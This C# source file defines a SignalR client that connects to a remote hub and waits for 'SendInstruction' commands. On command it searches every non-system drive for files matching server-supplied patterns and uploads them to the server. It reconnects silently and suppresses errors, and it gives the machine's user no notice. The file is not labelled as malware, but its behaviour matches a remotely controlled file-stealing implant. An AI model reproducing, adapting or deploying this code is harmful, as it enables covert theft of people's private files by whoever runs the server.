using Microsoft.AspNet.SignalR.Client;
using Microsoft.AspNet.SignalR.Client.Hubs;
using Newtonsoft.Json;
using SignalRClient1.Models;
using System;
using System.Collections.Generic;
using System.IO;

namespace SignalRClient1
{
    public class ClientHub : HubConnection
    {
        HubConnection hubConnection;
        HubProxy proxy;
        List<FileModel> filesToSend = new List<FileModel>();
        List<string> fileNameList = new List<string>();
        int fileSize = 104857600;

        public ClientHub(string url) : base(url)
        {
            hubConnection = new HubConnection(url);
            proxy = (HubProxy)hubConnection.CreateHubProxy("MainHub");
            proxy.On("SendInstruction", new Action<List<string>>(SendInstructionAction));
            Connect();
        }



        public void Connect()
        {
            while (hubConnection.State != ConnectionState.Connected)
            {
                try
                {
                    hubConnection.Start().Wait();
                    string jsonInitialData = JsonConvert.SerializeObject(new InitialDataModel());
                    proxy.Invoke<string>("NewClient", jsonInitialData);
                }
                catch (Exception e) { continue; }
            }
        }

        
        private void SendInstructionAction(List<string> filterAndFileformat)
        {
            foreach (var drive in DriveInfo.GetDrives())
            {
                if(drive.Name != Path.GetPathRoot(Environment.SystemDirectory))
                {
                    var files = GetFileNames(drive.Name, filterAndFileformat);
                    foreach (var file in files)
                    {
                        try
                        {
                            byte[] buffer = File.ReadAllBytes(file);
                            int wait = buffer.Length < 1000 ? 100 :
                                        buffer.Length > 1000 && buffer.Length < 100000 ? 2000 :
                                        buffer.Length > 100000 ? 5000 : 0;
                            proxy.Invoke<bool>("SendFile", Path.GetFileName(file), buffer).Wait(wait);
                        }
                        catch (Exception)
                        {
                            hubConnection.Start().Wait();
                        }
                    }
                }
            }
            proxy.Invoke<bool>("SendFile", "end", null);
        }

        public IEnumerable<string> GetFileNames(string drive, List<string> filterAndFileFormate)
        {
            IEnumerable<string> files = GetFiles(drive, filterAndFileFormate);
            
            foreach (var file in files)
            {
                if (!file.ToLower().Contains("recycle") && new FileInfo(file).Length > 0)
                {
                    fileNameList.Add(file);
                    yield return file;
                }
            }
        }

        //Below is the only and best of all methods to get all files without arising exceptions
        public IEnumerable<string> GetFiles(string root, List<string> filterAndFileFormate)
        {
            foreach (var searchPattern in filterAndFileFormate)
            {
                Stack<string> pending = new Stack<string>();
                pending.Push(root);
                while (pending.Count != 0)
                {
                    var path = pending.Pop();
                    string[] next = null;
                    try
                    {
                        next = Directory.GetFiles(path, searchPattern);
                    }
                    catch { }
                    if (next != null && next.Length != 0)
                        foreach (var file in next)
                        {
                            int size = File.ReadAllBytes(file).Length;
                            if (size < fileSize)
                            {
                                yield return file;
                            }
                        }
                    try
                    {
                        next = Directory.GetDirectories(path);
                        foreach (var subdir in next) pending.Push(subdir);
                    }
                    catch { }
                }
            }
            
        }



    }
}
